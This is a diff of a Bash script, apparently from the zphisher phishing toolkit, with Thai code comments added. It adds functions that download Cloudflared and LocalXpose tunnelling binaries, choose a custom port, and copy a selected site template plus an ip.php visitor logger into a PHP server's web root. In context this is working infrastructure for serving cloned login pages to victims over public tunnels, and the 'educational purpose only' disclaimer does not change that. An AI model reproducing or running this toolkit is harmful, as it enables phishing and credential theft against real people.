@@ -308,3 +308,125 @@ download() {
                 { reset_color; exit 1; }
         fi
 }
+
+
+
+## Install Cloudflared
+install_cloudflared() {
+        # ตรวจสอบว่ามีไฟล์ Cloudflared ติดตั้งอยู่แล้วหรือไม่
+        if [[ -e ".server/cloudflared" ]]; then
+                echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
+        else
+                # ถ้ายังไม่มีไฟล์ Cloudflared ให้ติดตั้ง
+                echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
+                arch=`uname -m` # ตรวจสอบสถาปัตยกรรมของเครื่อง
+                # ดาวน์โหลดไฟล์ที่เหมาะสมกับสถาปัตยกรรม
+                if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+                        download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
+                elif [[ "$arch" == *'aarch64'* ]]; then
+                        download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
+                elif [[ "$arch" == *'x86_64'* ]]; then
+                        download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
+                else
+                        download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
+                fi
+        fi
+}
+
+## Install LocalXpose
+install_localxpose() {
+        # ตรวจสอบว่ามีไฟล์ LocalXpose ติดตั้งอยู่แล้วหรือไม่
+        if [[ -e ".server/loclx" ]]; then
+                echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
+        else
+                # ถ้ายังไม่มีไฟล์ LocalXpose ให้ติดตั้ง
+                echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
+                arch=`uname -m` # ตรวจสอบสถาปัตยกรรมของเครื่อง
+                # ดาวน์โหลดไฟล์ที่เหมาะสมกับสถาปัตยกรรม
+                if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+                        download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
+                elif [[ "$arch" == *'aarch64'* ]]; then
+                        download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
+                elif [[ "$arch" == *'x86_64'* ]]; then
+                        download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
+                else
+                        download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
+                fi
+        fi
+}
+
+## Exit message
+msg_exit() {
+        # แสดงข้อความขอบคุณก่อนออกจากโปรแกรม
+        { clear; banner; echo; }
+        echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
+        { reset_color; exit 0; }
+}
+
+## About
+about() {
+        # แสดงข้อมูลเกี่ยวกับโปรแกรม เช่น ผู้พัฒนาและเวอร์ชัน
+        { clear; banner; echo; }
+        cat <<- EOF
+                ${GREEN} Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
+                ${GREEN} Github   ${RED}:  ${CYAN}https://github.com/htr-tech
+                ${GREEN} Social   ${RED}:  ${CYAN}https://tahmidrayat.is-a.dev
+                ${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
+
+                ${WHITE} ${REDBG}Warning:${RESETBG}
+                ${CYAN}  This Tool is made for educational purpose 
+                  only ${RED}!${WHITE}${CYAN} Author will not be responsible for 
+                  any misuse of this toolkit ${RED}!${WHITE}
+                
+                ${WHITE} ${CYANBG}Special Thanks to:${RESETBG}
+                ${GREEN}  รายชื่อผู้มีส่วนร่วมในการพัฒนา
+
+                ${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
+
+        EOF
+
+        # ให้ผู้ใช้เลือกว่าจะกลับไปหน้าหลักหรือออกจากโปรแกรม
+        read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+        case $REPLY in 
+                99)
+                        msg_exit;;
+                0 | 00)
+                        echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
+                        { sleep 1; main_menu; };;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; about; };;
+        esac
+}
+
+## Choose custom port
+cusport() {
+        # ฟังก์ชันให้ผู้ใช้เลือกพอร์ตแบบกำหนดเอง
+        echo
+        read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
+        if [[ ${P_ANS} =~ ^([yY])$ ]]; then
+                echo -e "\n"
+                # ให้ผู้ใช้กรอกพอร์ต 4 หลัก
+                read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
+                # ตรวจสอบว่าพอร์ตที่กรอกถูกต้องหรือไม่
+                if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
+                        PORT=${CU_P}
+                        echo
+                else
+                        echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
+                        { sleep 2; clear; banner_small; cusport; }
+                fi                
+        else 
+                echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
+        fi
+}
+
+## Setup website and start php server
+setup_site() {
+        # ตั้งค่าเว็บไซต์และเริ่มเซิร์ฟเวอร์ PHP
+        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
+        cp -rf .sites/"$website"/* .server/www
+        cp -f .sites/ip.php .server/www/
+        echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
+        cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
+}
